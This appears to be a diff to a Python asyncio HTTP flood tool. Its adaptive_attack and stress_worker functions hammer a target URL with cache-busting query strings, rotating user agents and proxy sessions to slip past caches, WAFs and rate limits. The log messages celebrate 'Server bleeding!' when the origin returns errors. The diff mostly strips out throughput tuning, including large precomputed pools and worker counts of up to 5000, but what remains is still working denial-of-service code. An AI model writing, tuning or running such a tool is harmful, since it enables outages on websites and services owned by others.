@@ -575,26 +575,6 @@ USER_AGENTS = [
     "sing-box/1.8.0"
 ]
 
-_HEADER_POOL = [
-    {
-        "User-Agent": ua,
-        "Accept": "*/*",
-        "Accept-Encoding": "gzip, deflate, br",
-        "Connection": "keep-alive",
-    }
-    for ua in USER_AGENTS
-]
-_HEADER_POOL_SIZE = len(_HEADER_POOL)
-
-_CB_ALPHABET = string.ascii_letters + string.digits
-_CB_POOL = [
-    ''.join(random.choices(_CB_ALPHABET, k=14))
-    for _ in range(100000)
-]
-_CB_POOL_SIZE = len(_CB_POOL)
-
-_REQ_TIMEOUT = aiohttp.ClientTimeout(total=8, connect=5, sock_read=7)
-
 ORIGIN_ERROR_CODES = {500, 501, 502, 503, 504, 507, 508, 510,
                       520, 521, 522, 523, 524, 525, 526, 527, 530}
 
@@ -2172,15 +2152,12 @@ async def adaptive_attack(worker_func, target_url, initial_concurrency,
     connector = aiohttp.TCPConnector(
         limit=0,
         limit_per_host=0,
-        ttl_dns_cache=600,
+        ttl_dns_cache=300,
         ssl=False,
         force_close=False,
         enable_cleanup_closed=True,
-        keepalive_timeout=45,
-        happy_eyeballs_delay=None,
     )
-    async with aiohttp.ClientSession(connector=connector,
-                                     auto_decompress=False) as direct_session:
+    async with aiohttp.ClientSession(connector=connector) as direct_session:
 
         if use_proxy and PROXY_MANAGER.working_proxies:
             created = await PROXY_MANAGER.create_sessions()
@@ -2364,47 +2341,28 @@ async def adaptive_attack(worker_func, target_url, initial_concurrency,
 async def stress_worker(direct_session, target_url, duration, stats,
                         use_proxy=False, safe_state=None, rps_limiter=None):
     start_time = time.monotonic()
-    end_time = start_time + duration
-    separator = "&" if "?" in target_url else "?"
-
-    worker_offset = random.randint(0, _CB_POOL_SIZE - 1)
-    cb_idx = worker_offset
-    hdr_idx = worker_offset % _HEADER_POOL_SIZE
-
-    rps_delay = 0.0
-    if rps_limiter is not None and rps_limiter.delay > 0:
-        rps_delay = rps_limiter.delay
-
-    safe_active = (safe_state is not None and safe_state.enabled)
-    perf_counter = time.perf_counter
-    monotonic = time.monotonic
-    proxy_off = not (use_proxy and PROXY_MANAGER.enabled and PROXY_MANAGER.sessions)
-
-    while monotonic() < end_time:
+    while time.monotonic() - start_time < duration:
         if _INTERRUPTED[0]:
             break
-        if safe_active and safe_state.active:
+        if safe_state is not None and safe_state.enabled and safe_state.active:
             await asyncio.sleep(1)
             continue
 
-        if rps_delay > 0:
-            await asyncio.sleep(rps_delay)
+        if rps_limiter is not None:
+            await rps_limiter.wait()
 
-        cb_idx += 1
-        if cb_idx >= _CB_POOL_SIZE:
-            cb_idx = 0
-        hdr_idx += 1
-        if hdr_idx >= _HEADER_POOL_SIZE:
-            hdr_idx = 0
-
-        url = f"{target_url}{separator}cache_bust={_CB_POOL[cb_idx]}"
-        headers = _HEADER_POOL[hdr_idx]
-
+        separator = "&" if "?" in target_url else "?"
+        url = f"{target_url}{separator}cache_bust={random_string(10)}"
+        headers = {
+            "User-Agent": random.choice(USER_AGENTS),
+            "Accept-Encoding": "gzip, deflate, br",
+            "Connection": "keep-alive"
+        }
         session = direct_session
         proxy_key = None
         use_ssl_ctx = False
 
-        if not proxy_off:
+        if use_proxy and PROXY_MANAGER.enabled and PROXY_MANAGER.sessions:
             got = PROXY_MANAGER.get_session()
             if got and got[0]:
                 session, proxy_key = got
@@ -2426,40 +2384,32 @@ async def stress_worker(direct_session, target_url, duration, stats,
         else:
             tag = f"  {Colors.DIM}[via DIRECT]{Colors.RESET}"
 
-        req_start = perf_counter()
+        req_start = time.perf_counter()
         stats["requests"] += 1
         try:
             ssl_param = PROXY_SSL_CTX if use_ssl_ctx else False
             async with session.get(url, headers=headers,
-                                   timeout=_REQ_TIMEOUT,
-                                   ssl=ssl_param,
-                                   allow_redirects=False) as response:
+                                   timeout=aiohttp.ClientTimeout(total=8),
+                                   ssl=ssl_param) as response:
+                latency = int((time.perf_counter() - req_start) * 1000)
                 status = response.status
                 if status == 200:
-                    await response.read()
-                    latency = int((perf_counter() - req_start) * 1000)
                     stats["success"] += 1
                     if proxy_key: PROXY_MANAGER.record_request(proxy_key, True)
                     log_event("200", f"Target hit!  Latency: {Colors.BOLD}{latency:>4}ms{Colors.RESET}{tag}")
                 elif status == 403:
-                    await response.read()
-                    latency = int((perf_counter() - req_start) * 1000)
                     stats["blocked"] += 1
                     if proxy_key: PROXY_MANAGER.record_request(proxy_key, False)
                     log_event("403", f"Blocked by WAF!  Latency: {latency}ms{tag}")
                 elif status == 429:
-                    await response.read()
-                    latency = int((perf_counter() - req_start) * 1000)
                     stats["rate_limit"] += 1
                     if proxy_key: PROXY_MANAGER.record_request(proxy_key, False)
                     log_event("429", f"Rate limit triggered.  Latency: {latency}ms{tag}")
                 elif status in ORIGIN_ERROR_CODES:
-                    await response.read()
-                    latency = int((perf_counter() - req_start) * 1000)
                     stats["server_error"] += 1
                     if proxy_key: PROXY_MANAGER.record_request(proxy_key, True)
                     log_event(str(status), f"Server bleeding!  Latency: {latency}ms{tag}")
-                    if safe_active:
+                    if safe_state is not None and safe_state.enabled:
                         if safe_state.trigger(status):
                             if LIVE_DASHBOARD.enabled:
                                 LIVE_DASHBOARD.add_event("Safe-Mode · Triggered")
@@ -2468,14 +2418,10 @@ async def stress_worker(direct_session, target_url, duration, stats,
                                       f"origin error {Colors.RED}{status}{Colors.RESET} detected  "
                                       f"{Colors.DIM}→{Colors.RESET}  pausing attack & monitoring")
                 elif 500 <= status <= 599:
-                    await response.read()
-                    latency = int((perf_counter() - req_start) * 1000)
                     stats["server_error"] += 1
                     if proxy_key: PROXY_MANAGER.record_request(proxy_key, True)
                     log_event(str(status), f"Server error!  Latency: {latency}ms{tag}")
                 else:
-                    await response.read()
-                    latency = int((perf_counter() - req_start) * 1000)
                     stats["other"] += 1
                     if proxy_key: PROXY_MANAGER.record_request(proxy_key, False)
                     log_event("OTHER", f"Status {status}.  Latency: {latency}ms{tag}")
@@ -2496,13 +2442,8 @@ async def run_benchmark(target_url, concurrency, duration, use_proxy,
                         safe_mode=False, rps=DEFAULT_RPS, _return_stats=False):
     stats = {"requests": 0, "success": 0, "rate_limit": 0, "blocked": 0,
              "server_error": 0, "timeouts": 0, "dropped": 0, "other": 0}
-
-    max_workers = max(5000, concurrency * 4)
-    min_workers = max(50, min(concurrency // 2, 200))
-
     stats = await adaptive_attack(stress_worker, target_url, concurrency,
-                                  max_concurrency=max_workers,
-                                  min_concurrency=min_workers,
+                                  max_concurrency=1000, min_concurrency=50,
                                   duration=duration, stats=stats,
                                   use_proxy=use_proxy, safe_mode=safe_mode,
                                   rps=rps)
